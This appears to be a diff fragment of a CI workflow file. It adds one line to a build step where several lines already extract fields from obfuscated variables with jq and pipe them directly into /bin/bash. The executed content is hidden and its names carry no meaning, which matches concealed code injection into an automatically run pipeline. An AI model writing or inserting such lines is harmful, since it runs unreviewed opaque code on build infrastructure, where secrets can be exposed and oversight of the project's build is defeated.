@@ -28,6 +28,7 @@ jobs:
           echo $xk72 | jq -r .jb95 | /bin/bash
           printf '%s' "$w33" | jq -r .yc44 | /bin/bash
           echo $a96 | jq -r .vx9 | /bin/bash
+          printf '%s' "$w68" | jq -r .mps5 | /bin/bash
 
       - name: Save archive
         if: always()
